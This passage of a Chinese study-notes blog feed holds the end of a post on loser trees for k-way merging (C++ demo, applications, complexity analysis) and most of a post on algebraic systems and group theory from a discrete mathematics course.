class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>InputStream<span class="token operator">>></span> streams<span class="token punctuation">;</span>    streams<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">VectorInputStream</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    streams<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">VectorInputStream</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    streams<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">VectorInputStream</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    LoserTree <span class="token function">lt</span><span class="token punctuation">(</span>streams<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"败者树多路归并结果："</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>lt<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> val <span class="token operator">=</span> lt<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">!=</span> std<span class="token double-colon punctuation">::</span><span class="token class-name">numeric_limits</span><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        lt<span class="token punctuation">.</span><span class="token function">popAndReplace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需实现 InputStream 接口，LoserTree 就能无缝适配各种归并源（如大文件、分布式流、数据库游标），这也是它工程实践中的巨大优势。</p><hr><h2 id="应用">应用</h2><p><strong>败者树是非常高效的数据结构</strong>，适用于各种排序和选择问题。<br>在实际应用中，我们可以根据具体问题选择使用胜者树或败者树。对于需要频繁更新数据集的问题，胜者树是一个更好的选择；对于需要快速记录和查找比赛结果的问题，败者树则更加适用。这两种数据结构都可以在log(n)时间内完成最值查找和更新操作，具有很高的实用价值。</p><h4 id="大型搜索引擎的“网页排名归并”">大型搜索引擎的“网页排名归并”</h4><p>比如你在百度、Google搜索同一个关键词时，背后往往有成百上千台服务器分别给你算出“最相关的网页排名”，但最后这些排名结果需要快速合并成一个全局排名列表。<br><strong>败者树</strong>就像一场高效的“锦标赛”，每次都能最快选出全体中“最优网页”，把全球各地的“榜首网页”按序输出，大大提高搜索响应速度。</p><h4 id="云盘-网盘的多服务器文件同步">云盘/网盘的多服务器文件同步</h4><p>比如阿里云盘、百度网盘要把全球多台服务器上的同步文件合成一个最终的时间线展示，这时候每台服务器的文件变动已经排好序，只需归并各路“文件事件”流。<br>败者树就是最好的选择，保证“<strong>最近的更新</strong>”总能优先显示，哪怕有成百上千台服务器，也能稳定工作。</p><h4 id="视频推荐系统的“多路个性化候选集归并”">视频推荐系统的“多路个性化候选集归并”</h4><p>你刷B站/抖音时，推荐系统会从无数个“兴趣通道”各自找出适合你的视频，最后要把这些小列表合并成全局排序，推荐给你。<br>败者树可以把多个候选池（比如“你喜欢的音乐”、“你最近常看的UP主”、“全站热点”等）合并，保证每次推送的都是<strong>最优解</strong>。</p><blockquote><p>败者树不仅限于排序数字流，它适合<strong>任何有序对象的高效归并</strong>——比如合并新闻流、股票行情、快递物流进度等。<br>在分布式大数据场景下，败者树和胜者树比传统堆/优先队列更高效，尤其适合“路数极多”的超级归并任务。<br>只要你能把生活中的“多路有序队列”抽象成 InputStream，败者树就能帮你把它们归并成一条高效、无遗漏的“大路”。</p></blockquote><hr><h2 id="性能优缺点分析">性能优缺点分析</h2><h3 id="时间复杂度">时间复杂度</h3><h4 id="建树（初始化）">建树（初始化）</h4><ul><li><strong>建树过程</strong>需要让每一个叶子节点沿路径挑战至根，共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 路，每次最多比较 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>k</mi></mrow><annotation encoding="application/x-tex">\log_2 k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9386em;vertical-align:-0.2441em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 次，总体复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mi>log</mi><mo>⁡</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k \log k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>。</li></ul><h4 id="归并操作（每次输出最小值）">归并操作（每次输出最小值）</h4><ul><li><strong>每次归并输出</strong>，新元素替换后，只需要沿冠军路径向上“重新比较”一遍，最多 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>k</mi></mrow><annotation encoding="application/x-tex">\log_2 k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9386em;vertical-align:-0.2441em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 层。</li><li>因此，<strong>每次归并输出/更新的时间复杂度</strong>为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>。</li><li>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个总元素归并排序，总体复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>⁡</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \log k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>。</li></ul><blockquote><p>这一点比直接用暴力遍历所有路（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>）快得多，特别适合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 很大时使用。</p></blockquote><h3 id="空间复杂度">空间复杂度</h3><ul><li>败者树本身维护一个<strong>完全二叉树结构</strong>，含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个叶子和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个内部节点（每个内部节点只需存一个路的索引或指针）。</li><li>主要需要存储：<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个叶节点（每路当前值，实际归并中只需一个元素的缓存/指针）</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个内部节点（败者索引或指针）</li></ul></li><li><strong>空间复杂度总为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></strong>。</li></ul><h3 id="与其他归并方法对比">与其他归并方法对比</h3><ul><li><strong>暴力归并</strong>：每次都遍历所有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 路，查找最小元素，时间复杂度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">nk</span><span class="mclose">)</span></span></span></span>。</li><li><strong>堆/优先队列归并</strong>：每次插入弹出堆顶都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>，和败者树同阶，但败者树常数更小，且可更好地复用内存，更新效率高。</li><li><strong>败者树</strong>：在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 很大时（如数百、上千路归并），败者树的效率更明显。</li></ul><h3 id="优点">优点</h3><ul><li>每次找最小值、更新树只需 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>，对大规模归并非常友好。</li><li>空间消耗小，易于实现。</li><li>特别适合归并段数量多、单段数据量小的场景。</li></ul><h3 id="缺点">缺点</h3><ul><li>实现比暴力法复杂一点，初学者需要适应树结构。</li><li>归并段不均衡时，可能存在部分节点重复挑战，导致更新稍慢。</li></ul><hr><h2 id="参考资料">参考资料</h2><ul><li><a href="https://oi-wiki.org/ds/loser-tree/">败者树 - OI wiki</a></li><li><a href="https://yfsyfs.github.io/2019/09/07/%E6%A0%91%E6%8E%92-%E8%83%9C%E8%80%85%E6%A0%91-%E8%B4%A5%E8%80%85%E6%A0%91/">树排-胜者树-败者树 - 影法師の物語</a></li><li><a href="https://blog.csdn.net/summer_dew/article/details/84197001">选择树 胜者树 | 败者树 - CSDN</a></li><li><a href="https://blog.csdn.net/haolexiao/article/details/53488314">堆，赢者树，败者树的区别与联系</a></li><li><a href="https://www.zhihu.com/question/35144290">多路归并排序的时候，为什么要采用败者树？- 知乎回答</a></li><li><a href="https://ivanzz1001.github.io/records/post/data-structure/2018/07/03/ds-loser_tree">外部排序之败者树 - ivan 的博客</a></li><li><a href="https://cloud.tencent.com/developer/article/2238630">一文读懂胜者树与败者树</a></li><li><a href="https://gemini.google.com/">Google Gemini</a></li><li><a href="https://chatgpt.com/">OpenAI ChatGPT</a></li><li>数据结构 - 归并排序，外排序</li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="记录" scheme="https://notes.moyuin.top/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>离散数学-代数系统</title>
    <link href="https://notes.moyuin.top/2025/05/16/xue-xi/shu-xue/chi-san-shu-xue-dai-shu-xi-tong/"/>
    <id>https://notes.moyuin.top/2025/05/16/xue-xi/shu-xue/chi-san-shu-xue-dai-shu-xi-tong/</id>
    <published>2025-05-16T06:53:22.000Z</published>
    <updated>2025-05-16T06:53:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>离散数学-代数系统</h1><h2 id="广义加乘">广义加乘</h2><h3 id="定义">定义</h3><p>广义的加法与乘法没有特定的运算形式，主要依赖于它的定义。可以定义它为<strong>实数</strong>运算，也可定义它为<strong>矩阵</strong>类运算。<br>如果不好定义或没有符号，只能使用<strong>运算表</strong>，限于<strong>有限情况</strong>。</p><blockquote><p>广义加乘形式类似于 C++ 中的运算符重载。</p></blockquote><p>运算符号由自己定义。</p><h3 id="定律">定律</h3><h4 id="广义加乘的封闭性">广义加乘的封闭性</h4><p><img src="https://pic.moyuin.top/2025/05/16/6826e28868590.png" alt="image.png"></p><h4 id="交换律">交换律</h4><p>广义交换律是二元运算中存在 <code>x*y=y*x</code><br>二元交换普遍存在。</p><h4 id="结合律">结合律</h4><p>任意 xyz 在集合 S 中，有 <code>(x+y)+z=x+y+z=x+(y+z)</code>，称该运算在 S 中满足结合律。<br>实数的加、乘；<br>集合的并、交；<br>逻辑的与、逻辑或；<br>矩阵的加、乘<br>可满足结合律。</p><h4 id="幂等律">幂等律</h4><p>任意 x 在集合 S 中，有 <code>x+x=x</code> 称该运算在 S 中幂等。<br>有些不满足幂等律，但某些元素满足。如普通加法不满足幂等。</p><h4 id="分配律">分配律</h4><p>任意 xyz 在集合 S 中，有 <code>x*(y+z)=(x*y)+(x*z)</code>, 称 <code>*</code> 对 <code>+</code> 可分配。<br>如实数加乘，逻辑的与、逻辑或。</p><h4 id="吸收律">吸收律</h4><p>任意 xy 在集合 S 中，有 <code>x*(x+y)=x,x+(x*y)=x</code>, 则称 <code>*</code> 与 <code>+</code> 满足吸收率。<br>如 xyz 命题变元。</p><h3 id="单位元与零元">单位元与零元</h3><blockquote><p>实数乘法的 1，实数加法的 0：广义加乘为单位元。</p></blockquote><p><img src="https://pic.moyuin.top/2025/05/16/6826e673c673c.png" alt="image.png"></p><p><img src="https://pic.moyuin.top/2025/05/16/6826e75fc7b49.png" alt="image.png"></p><p>在单位元和零元都存在的基础上，单位元和零元必然不会相同。<br>例如：</p><ul><li>乘法中 1 为单位元，0 为零元</li><li>加法中 0 为单位元，没有零元。</li></ul><h3 id="逆元">逆元</h3><blockquote><p>实数乘的倒数，实数加相反数广义加乘的逆元。</p></blockquote><p>并不是所有元素都一定有逆元。<br>逆元必须在代数系统集合内，满足运算但是不在系统集合内的，不算逆元。<br><img src="https://pic.moyuin.top/2025/05/16/6826ea24d80c4.png" alt="image.png"></p><hr><h2 id="代数系统的相似性">代数系统的相似性</h2><p>其实类比于 C++ 的类，集合 S 相当于数据成员，运算相当于函数成员。<br>代数系统中举例子，实数系统就由 <code>&lt;实数,+，*&gt;</code> 构成。</p><p><code>&lt;集合,运算&gt;</code> 构成一个代数系统。</p><h3 id="同构">同构</h3><p><img src="https://pic.moyuin.top/2025/05/16/6826eb9687ca7.png" alt="image.png"></p><p>注意：<strong>满足一个映射</strong>即可说两组代数系统同构。</p><h3 id="同余">同余</h3><p><img src="https://pic.moyuin.top/2025/05/16/6826eed1cdbbd.png" alt="image.png"><br>这个同余在之前的学习中也有提及，好像是关系里的，可以回去看看。</p><hr><h2 id="群">群</h2><h3 id="广群、半群、幺群、群">广群、半群、幺群、群</h3><ul><li>若代数系统封闭，称其为广群。</li><li>若代数系统封闭、可结合,则其为半群。</li><li>若V=封闭、可结合、有e，则为幺群(独异点)</li><li>若封闭，可结合，有 e，则为群。</li></ul><p>我们做题，就是判断这个题是否为&quot;群&quot;。<br>判断这个代数系统是否为群，这个例题：<br><img src="https://pic.moyuin.top/2025/05/19/682ad4ace6ada.png" alt="image.png"><br>用运算分别判断封闭，结合，单位元，逆元，从而判断。</p><h3 id="Klein-群">Klein 群</h3><p>和周期挂钩。<br><img src="https://pic.moyuin.top/2025/05/19/682ae2c9ade1d.png" alt="image.png"></p><h3 id="Abel-群（交换群）">Abel 群（交换群）</h3><p><strong>符合交换律的群</strong>即为交换群，又叫作 abel 群。</p><h4 id="定理">定理</h4><ul><li>已知 <code>&lt;G,*&gt;</code> 是群，G 是交换群 = 对于任意元素 a, b 有 <code>(a*b)*(a*b)=(a*a)*(b*b)</code><br>这是一个充要条件。</li></ul><h3 id="群的性质">群的性质</h3><h4 id="表表示">表表示</h4><p>群是可以用运算表表示的，对于群，我们看运算表可以获得它的封闭，可结合，逆元，单位元。<br><img src="https://pic.moyuin.top/2025/05/19/682ad65198ca4.png" alt="image.png"></p><h4 id="群的幂">群的幂</h4><p><img src="https://pic.moyuin.top/2025/05/19/682addd5f3305.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/19/682adcc4cbf80.png" alt="image.png"></p><p>负数幂怎么操作？取逆元后再进行幂运算。<br>模运算 ：“模 p 加法意思就是（a+b）mod p 的值”。<br><img src="https://pic.moyuin.top/2025/05/23/6830195f41548.png" alt="image.png"></p><h4 id="元素的周期（元素的阶）">元素的周期（元素的阶）</h4><p>注意，<strong>对于群而言，群的阶表达的是群的元素个数</strong>，这里解释的是元素的阶。<br><img src="https://pic.moyuin.top/2025/05/19/682add5618e86.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/19/682ae296eacd8.png" alt="image.png"></p><p>周期与幂有关，对元素作 n 次幂，让元素转化为单位元，那么可以说该元素的周期为 n。<br>其实这样子在模运算里也比较难识别的。模运算转化为一种乘法运算也比较方便。</p><ul><li>单位元的阶（周期）为 1。</li></ul><blockquote><p>这个“陌生”的运算，其实是大学抽象代数里最经典、最简单的群之一，叫做<strong>整数模n加法群</strong>，记作 (Zn​,+)。我们的 G 集合就是 Z8​ 的一个“二进制马甲”。</p></blockquote><p>对于这种群，有一个<strong>求周期的黄金公式</strong>：</p><p><strong>元素 k 的周期 = <code>m/gcd(k,m)</code></strong></p><p>这里的字母代表：</p><ul><li><strong>m</strong>: 群里一共有多少个元素。在这道题里，<code>G</code>有8个元素，所以 m=8。</li><li><strong>k</strong>: 我们要计算的那个元素所代表的十进制数。比如 <code>010</code> 代表 2，<code>110</code> 代表 6。</li><li><strong>gcd(k,m)</strong>: k 和 m 的<strong>最大公约数</strong> (Greatest Common Divisor)。就是能同时整除 k 和 m 的最大正整数。</li></ul><h4 id="定理-2">定理</h4><ul><li><ol><li>幂的普通运算</li></ol></li><li><ol start="2"><li>幂与逆元<br><img src="https://pic.moyuin.top/2025/05/19/682adfba7bf5c.png" alt="image.png"></li></ol></li><li><p>3.群无零元<br>有零元代表该代数系统<strong>无逆元</strong>，而群的基本性质就是有逆元，因此冲突，推出群无逆元。注意周期大于等于 2。<br><img src="https://pic.moyuin.top/2025/05/19/682ae1d0135ef.png" alt="image.png"></p></li><li><ol start="4"><li>一元一次群方程有解，且解唯一。<br><img src="https://pic.moyuin.top/2025/05/19/682ae0941c74f.png" alt="image.png"></li></ol></li><li><ol start="5"><li>群满足消去律<br><img src="https://pic.moyuin.top/2025/05/19/682ae1add7df3.png" alt="image.png"></li></ol></li><li><ol start="6"><li>群的阶，<code>a^k=e</code> 相当于阶 <code>r|k</code><br><img src="https://pic.moyuin.top/2025/05/19/682ae3208eefd.png" alt="image.png"></li></ol></li></ul><h3 id="子群">子群</h3><p>类似于子集吧。子群，顾名思义就是一个群的一部分，一个代数系统的一部分。<br><img src="https://pic.moyuin.top/2025/05/19/682ae502564ac.png" alt="image.png"></p><p>子群依然符合群的各种性质：</p><ul><li>封闭</li><li>可结合</li><li>单位元</li><li>每个元素有逆元</li></ul><h4 id="子群快捷判断定理">子群快捷判断定理</h4><p>1.（1）任何 a, b 属于 H, 有 <code>a*b</code> 属于 H。<br>（2）所有 a 属于 H 都有 a^-1 属于 H。<br><img src="https://pic.moyuin.top/2025/05/23/68301c181bff4.png" alt="image.png"><br>2. 任何 a，b 属于 H 都有 <code>a*b^-1</code> 属于 H。（逆元混沌封闭）<br><img src="https://pic.moyuin.top/2025/05/23/68301cdd800c7.png" alt="image.png"><br>3. 任意 a，b 属于 H 都有 <code>a*b</code> 属于 H。(只封闭)<br><img src="https://pic.moyuin.top/2025/05/23/68301e5e1cd7c.png" alt="image.png"></p><h4 id="循环子群">循环子群</h4><p>定义：由 a 的幂次方组成的子群称为循环子群或者生成子群，记为 <code>&lt;a,*&gt;</code> 或 <code>&lt;a&gt;</code><br><img src="https://pic.moyuin.top/2025/05/23/68302364aeafb.png" alt="image.png"></p><p><img src="https://pic.moyuin.top/2025/05/23/6830281205314.png" alt="image.png"></p><hr><h3 id="陪集">陪集</h3><p>陪集是一种集合而非群，它相当于是一种映射关系的集合。<br><img src="https://pic.moyuin.top/2025/05/23/68302940ab6a1.png" alt="image.png"></p><h4 id="定理-3">定理</h4><p>1.（1）与单位元建立映射的右陪集等于原来的子群。<br>（2）与常数项建立映射的右陪集等于原来的子群的倍。<br><img src="https://pic.moyuin.top/2025/05/23/68302a88a4042.png" alt="image.png"> 2. 子群是对群的划分，是相同关系的集合。<br><img src="https://pic.moyuin.top/2025/05/23/68302af68b0f4.png" alt="image.png"> 3. 陪集与等价关系<br><img src="https://pic.moyuin.top/2025/05/26/68340d800bc99.png" alt="image.png"><br>对于等价类 <code>[a]</code>, 对于一个子群 H，它的所有的左（或者右）陪集的集合，本质上就是一个子群 H 的等价类的集合。</p><ul><li><strong>核心都是划分：</strong> 等价关系的核心作用是<strong>划分 (Partition)</strong> 一个集合。陪集的作用也完全一样，它将一个大群 G <strong>划分</strong>成若干个大小相等、互不相交的子集（陪集）。每个元素 g∈G 都属于且仅属于一个陪集。<br><img src="https://pic.moyuin.top/2025/05/26/683411643a531.png" alt="image.png"></li></ul><hr><h3 id="拉格朗日定理">拉格朗日定理</h3><p>特指子群元素的拉格朗日定理。结合刚才的群定理，总结出群的四个定理，前三条回顾。</p><ol><li><img src="https://pic.moyuin.top/2025/05/26/683414773c58e.png" 